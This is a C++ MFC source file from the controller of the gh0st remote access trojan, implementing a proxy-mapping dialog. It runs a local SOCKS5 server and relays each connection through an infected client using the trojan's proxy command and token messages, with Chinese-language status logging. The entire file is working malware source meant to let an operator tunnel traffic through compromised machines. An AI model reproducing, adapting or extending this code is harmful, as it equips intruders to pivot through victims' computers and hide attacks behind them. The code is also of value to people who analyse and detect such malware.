// ProxyMapDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "ProxyMapDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CProxyMapDlg dialog

CProxyMapDlg	*g_pProxyMap;

CProxyMapDlg::CProxyMapDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CProxyMapDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CProxyMapDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_iocpLocal		= NULL;
	g_pProxyMap     = this;
}


void CProxyMapDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CProxyMapDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	//}}AFX_DATA_MAP
}
#define WM_NOTIFYPROC (WM_USER+109)

BEGIN_MESSAGE_MAP(CProxyMapDlg, CDialog)
	//{{AFX_MSG_MAP(CProxyMapDlg)
	ON_WM_CLOSE()
	ON_MESSAGE(WM_NOTIFYPROC, OnNotifyProc)
	ON_WM_SIZE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CProxyMapDlg message handlers


BOOL CProxyMapDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	m_iocpLocal = new CIOCPLOCAL;

	if (m_iocpLocal == NULL)
	{
		AfxMessageBox("CIOCPLOCAL == NULL");
		return FALSE;
	}

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度
	
	CString		str;
	DWORD		nPort;
	// 开启IPCP服务器
	if (m_iocpLocal->Initialize(NotifyProc, 100000, 0))
	{
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		getsockname(m_iocpLocal->m_socListen, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		nPort = ntohs(sockAddr.sin_port) ;

		BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	    m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";


		str.Format(_T("\\\\%s 代理服务器 端口: %d \r\n"),m_IPAddress, nPort);
		SetWindowText(str);
/*
		WriteRegEx(HKEY_CURRENT_USER, _T("Software\\Permeo Technologies\\SocksCap32\\Connections"),
			_T("SocksPort"), REG_DWORD, (TCHAR *)&nPort, nPort, 1);
		WriteRegEx(HKEY_CURRENT_USER, _T("Software\\Permeo Technologies\\SocksCap32\\Connections"),
			_T("SocksServer"),REG_SZ,_T("127.0.0.1"),0,1);*/

		str.Format(_T("已设置sockscap32，使用其他socks代理软件请设置服务器为:127.0.0.1, 端口为:%d \r\n"),nPort);
		AddLog(str.GetBuffer(0));	
	}
	else
	{
		str.Format(_T("\\\\代理服务器 端口绑定失败 \r\n"));
		SetWindowText(str);
 	}
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CProxyMapDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);

	m_iocpLocal->Shutdown();
	delete m_iocpLocal;

	CDialog::OnClose();
}

LRESULT CProxyMapDlg::OnNotifyProc(WPARAM wParam, LPARAM lParam)
{
	ClientContext * pContext=(ClientContext *)lParam;
	DWORD index = pContext->dwID;
	TCHAR szMsg[200]={0};
	try
 	{
		switch (wParam)
		{
		case NC_CLIENT_CONNECT:
			pContexts[index]=pContext;
			wsprintf(szMsg,_T("%d new connection\r\n"),index);
			break;
		case NC_CLIENT_DISCONNECT:
			if(pContext->m_bProxyConnected)
			{
				BYTE lpData[5];
				lpData[0]=COMMAND_PROXY_CLOSE;
				memcpy(lpData+1,&index,sizeof(DWORD));
				m_iocpServer->Send(m_pContext,lpData,5);
			}
			wsprintf(szMsg,_T("%d disconnect\r\n"),index);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			if(pContext->m_bProxyConnected==2)
			{
				m_iocpServer->Send(m_pContext,pContext->m_CompressionBuffer.GetBuffer(),
					pContext->m_CompressionBuffer.GetBufferLen());
				wsprintf(szMsg,_T("%d <==发 %d bytes\r\n"),index,pContext->m_CompressionBuffer.GetBufferLen()-5);
			}
			else if(pContext->m_bProxyConnected==0)
			{
				BYTE buf[2];
				LPBYTE lpData=pContext->m_CompressionBuffer.GetBuffer(5);
				buf[0]=5;
				buf[1]=0;
				pContext->m_bProxyConnected=1;
				m_iocpLocal->Send(pContext,buf,2);
				wsprintf(szMsg,_T("%d 返回标示 %d %d %d\r\n"),index,lpData[0],lpData[1],lpData[2]);
			}
			else if(pContext->m_bProxyConnected==1)
			{
				LPBYTE lpData=pContext->m_CompressionBuffer.GetBuffer(5);
				BYTE buf[11];
				if(lpData[0]==5 && lpData[1]==1 && lpData[3]==1 && pContext->m_CompressionBuffer.GetBufferLen()>10)
				{
					buf[0]=COMMAND_PROXY_CONNECT;
					memcpy(buf+1,&index,4);
					memcpy(buf+5,lpData+4,6);
					m_iocpServer->Send(m_pContext,buf,sizeof(buf));
					in_addr inaddr; 
					inaddr.s_addr=*(DWORD *)(buf+5); 

					wsprintf(szMsg,_T("%d connecting %s:%d...\r\n"),index,inet_ntoa(inaddr),ntohs(*(USHORT *)(buf+9)));

				}
				else
				{
					buf[0]=5;
					buf[1]=7;
					buf[2]=0;
					buf[3]=lpData[3];
					m_iocpLocal->Send(pContext,buf,sizeof(buf));
					closesocket(pContext->m_Socket );
					wsprintf(szMsg,_T("%d 不符要求,断开 %d %d %d\r\n"),index,lpData[0],lpData[1],lpData[3]);
				}
			}
			break;
		}
	}catch(...){}
	if (szMsg[0]) 
		AddLog(szMsg);
	return 0;
}


void CProxyMapDlg::OnReceiveComplete()
{
	if(m_iocpLocal == NULL)
		return;

	LPBYTE buf=m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	DWORD index=*(DWORD*)&buf[1];
	TCHAR szMsg[200];
	switch (buf[0])
	{
	case TOKEN_PROXY_CONNECT_RESULT:
		BYTE sendbuf[10];
		sendbuf[0]=5;
		sendbuf[1]=(buf[9] || buf[10])? 0 : 5; 
		sendbuf[2]=0;
		sendbuf[3]=1;
		memcpy(&sendbuf[4],&buf[5],6);
		if (sendbuf[1]==0)
		{
			pContexts[index]->m_bProxyConnected =2;
			wsprintf(szMsg,_T("%d 连接成功\r\n"),index);
		}else
			wsprintf(szMsg,_T("%d 连接失败\r\n"),index);
		m_iocpLocal->Send(pContexts[index],sendbuf,sizeof(sendbuf));
		AddLog(szMsg);
		break;
	case TOKEN_PROXY_BIND_RESULT:
		break;
	case TOKEN_PROXY_CLOSE:
		wsprintf(szMsg,_T("%d TOKEN_PROXY_CLOSE\r\n"),index);
		AddLog(szMsg);
		if(pContexts[index]->m_Socket && pContexts[index]->m_Socket!=INVALID_SOCKET)
		{
			LINGER lingerStruct;
			lingerStruct.l_onoff = 1;
			lingerStruct.l_linger = 1;
			setsockopt(pContexts[index]->m_Socket, SOL_SOCKET, SO_LINGER,
				(char *)&lingerStruct, sizeof(lingerStruct) );
			shutdown(pContexts[index]->m_Socket, SD_SEND);
			closesocket(pContexts[index]->m_Socket);
			pContexts[index]->m_Socket=0;
		}
		break;
	case TOKEN_PROXY_DATA:
		m_iocpLocal->Send(pContexts[index],&buf[5],m_pContext->m_DeCompressionBuffer.GetBufferLen()-5);
		wsprintf(szMsg,_T("%d ==>收 %d bytes\r\n"),index,m_pContext->m_DeCompressionBuffer.GetBufferLen()-5);
		AddLog(szMsg);
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

void CALLBACK CProxyMapDlg::NotifyProc(ClientContext *pContext, UINT nCode)
{
#ifdef _DEBUG
	g_pProxyMap->SendMessage(WM_NOTIFYPROC,nCode,(LPARAM)pContext);
#else
	g_pProxyMap->OnNotifyProc(nCode,(LPARAM)pContext);
#endif
}

void CProxyMapDlg::AddLog(TCHAR * lpText)
{
	m_edit.SetSel(-1, -1);
	m_edit.ReplaceSel(lpText);
}

void CProxyMapDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;
	
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}
